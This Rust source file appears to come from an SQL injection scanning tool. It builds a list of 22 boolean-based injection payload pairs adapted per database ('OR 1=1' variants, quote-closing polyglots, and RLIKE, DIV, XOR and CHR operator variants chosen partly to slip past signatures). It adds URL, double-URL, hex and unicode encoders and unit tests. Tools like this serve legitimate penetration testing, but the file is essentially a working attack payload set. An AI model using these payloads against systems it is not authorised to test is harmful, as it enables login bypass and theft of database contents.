#![deny(unsafe_code)]

use std::fmt::Write as _;

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct BooleanPayload {
    pub true_payload: String,
    pub false_payload: String,
    pub comment: String,
}

impl BooleanPayload {
    #[must_use]
    pub fn new(
        true_payload: impl Into<String>,
        false_payload: impl Into<String>,
        comment: impl Into<String>,
    ) -> Self {
        Self {
            true_payload: true_payload.into(),
            false_payload: false_payload.into(),
            comment: comment.into(),
        }
    }
}

/// Generate boolean payloads adapted per DBMS.
///
/// Ordering is load-bearing for `--level` budgets (`payload_budget(level, 2, …)`):
/// L1 tries the first 2 (polyglot + historical `' OR 1=1`), L2 the first 4,
/// L3+ the whole list. The five historical payloads keep their relative order
/// right after the head polyglot so L1/L2 behaviour stays byte-identical when
/// the polyglot probe is inconclusive.
///
/// Every pair is TRUE/FALSE-coherent (same shape, minimal `1`↔`2` / `a`↔`b`
/// flip) so [`crate::techniques::tamper::tamper_transformation_sets`] can apply
/// the same transformation set to both branches without mismatching indices.
#[allow(clippy::too_many_lines)] // flat data table: one block per pair, no logic
#[must_use]
pub fn boolean_payloads_for(dbms: Option<&str>) -> Vec<BooleanPayload> {
    #[allow(clippy::match_same_arms)]
    let comment = match dbms {
        Some("mysql") => " -- -",
        Some("postgres") => " --",
        Some("mssql") => " --",
        Some("oracle") => " --",
        _ => " -- -",
    };
    vec![
        // P0-1 head polyglot (single-quote dominant): closes `'`, `"` and
        // `()))` in one probe. Double-quote variant sits at index 6 so L1
        // keeps `[poly, historical ' OR 1=1]` for backward compatibility.
        BooleanPayload::new(
            format!(r#"'"())) OR '1'='1'{comment}"#),
            format!(r#"'"())) OR '1'='2'{comment}"#),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 1=1{comment}"),
            format!("' OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' AND 1=1{comment}"),
            format!("' AND 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("\" OR 1=1{comment}"),
            format!("\" OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!(") OR 1=1{comment}"),
            format!(") OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 'a'='a{comment}"),
            format!("' OR 'a'='b{comment}"),
            comment,
        ),
        // Double-quote dominant polyglot variant (mirror prefix).
        BooleanPayload::new(
            format!(r#""'())) OR "1"="1"{comment}"#),
            format!(r#""'())) OR "1"="2"{comment}"#),
            comment,
        ),
        // Numeric context: no leading quote (replaces `id=1` with `1 AND …`).
        BooleanPayload::new(
            format!("1 AND 1=1{comment}"),
            format!("1 AND 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("1 OR 1=1{comment}"),
            format!("1 OR 1=2{comment}"),
            comment,
        ),
        // Multi-paren closings.
        BooleanPayload::new(
            format!("')) OR 1=1{comment}"),
            format!("')) OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("\")) OR 1=1{comment}"),
            format!("\")) OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("))) OR 1=1{comment}"),
            format!("))) OR 1=2{comment}"),
            comment,
        ),
        // MySQL backtick identifier closing.
        BooleanPayload::new(
            format!("` OR 1=1{comment}"),
            format!("` OR 1=2{comment}"),
            comment,
        ),
        // Operator variants (same TRUE/FALSE coherence: `a`↔`b` flip).
        BooleanPayload::new(
            format!("' OR 'a' LIKE 'a'{comment}"),
            format!("' OR 'a' LIKE 'b'{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 'a' IN ('a'){comment}"),
            format!("' OR 'a' IN ('b'){comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 'b' BETWEEN 'a' AND 'c'{comment}"),
            format!("' OR 'z' BETWEEN 'a' AND 'c'{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1{comment}"),
            format!("' OR (CASE WHEN (1=2) THEN 1 ELSE 0 END)=1{comment}"),
            comment,
        ),
        // Phase 1 P0 operator variants (appended last so L1/L2 budgets stay
        // byte-identical): RLIKE (LIKE is often signatured), DIV / XOR
        // arithmetic oracles, and quoteless CHR/CHAR function comparisons.
        BooleanPayload::new(
            format!("' OR 'a' RLIKE 'a'{comment}"),
            format!("' OR 'a' RLIKE 'b'{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 1 DIV 1{comment}"),
            format!("' OR 1 DIV 0{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 1 XOR 0{comment}"),
            format!("' OR 1 XOR 1{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR CHR(97)=CHR(97){comment}"),
            format!("' OR CHR(97)=CHR(98){comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR CHAR(97)=CHAR(97){comment}"),
            format!("' OR CHAR(97)=CHAR(98){comment}"),
            comment,
        ),
    ]
}

/// Encodings: URL, double-URL, hex, unicode, whitespace variants, case mixing.
#[must_use]
pub fn encode_payload(payload: &str, encoding: &str) -> String {
    match encoding {
        "url" => url::form_urlencoded::byte_serialize(payload.as_bytes()).collect(),
        "double_url" => {
            let once: String = url::form_urlencoded::byte_serialize(payload.as_bytes()).collect();
            url::form_urlencoded::byte_serialize(once.as_bytes()).collect()
        }
        "hex" => payload.bytes().fold(String::new(), |mut acc, b| {
            let _ = write!(acc, "%{b:02x}");
            acc
        }),
        "unicode" => payload.chars().fold(String::new(), |mut acc, c| {
            let _ = write!(acc, "%u{:04x}", c as u32);
            acc
        }),
        _ => payload.to_owned(),
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn head_order_stable_for_level_budgets() {
        // L1 takes the first 2, L2 the first 4: the head polyglot plus the
        // historical payloads must keep their relative order.
        let payloads = boolean_payloads_for(None);
        assert!(payloads[0].true_payload.contains("())) OR"));
        assert_eq!(payloads[1].true_payload, "' OR 1=1 -- -");
        assert_eq!(payloads[2].true_payload, "' AND 1=1 -- -");
        assert_eq!(payloads[3].true_payload, "\" OR 1=1 -- -");
    }

    #[test]
    fn p0_operator_pairs_present_and_coherent() {
        let payloads = boolean_payloads_for(None);
        assert_eq!(payloads.len(), 22);
        let find = |needle: &str| {
            payloads
                .iter()
                .find(|p| p.true_payload.contains(needle))
                .unwrap_or_else(|| panic!("missing pair for {needle}"))
                .clone()
        };
        let rlike = find("RLIKE");
        assert_eq!(rlike.true_payload, "' OR 'a' RLIKE 'a' -- -");
        assert_eq!(rlike.false_payload, "' OR 'a' RLIKE 'b' -- -");
        let div = find("DIV");
        assert_eq!(div.true_payload, "' OR 1 DIV 1 -- -");
        assert_eq!(div.false_payload, "' OR 1 DIV 0 -- -");
        let xor = find("XOR");
        assert_eq!(xor.true_payload, "' OR 1 XOR 0 -- -");
        assert_eq!(xor.false_payload, "' OR 1 XOR 1 -- -");
        let chr = find("CHR(97)=CHR(97)");
        assert_eq!(chr.false_payload, "' OR CHR(97)=CHR(98) -- -");
        let chr_upper = find("CHAR(97)=CHAR(97)");
        assert_eq!(chr_upper.false_payload, "' OR CHAR(97)=CHAR(98) -- -");
        // every pair stays TRUE/FALSE-distinct
        for p in &payloads {
            assert_ne!(
                p.true_payload, p.false_payload,
                "collapsed pair: {}",
                p.true_payload
            );
        }
    }

    #[test]
    fn p0_pairs_follow_dbms_comment() {
        for dbms in [Some("mysql"), Some("postgres"), None] {
            let payloads = boolean_payloads_for(dbms);
            let xor = payloads
                .iter()
                .find(|p| p.true_payload.contains("XOR"))
                .expect("xor pair");
            let expected = match dbms {
                Some("mysql") | None => " -- -",
                _ => " --",
            };
            assert!(
                xor.true_payload.ends_with(expected),
                "got {}",
                xor.true_payload
            );
            assert!(
                xor.false_payload.ends_with(expected),
                "got {}",
                xor.false_payload
            );
        }
    }
}
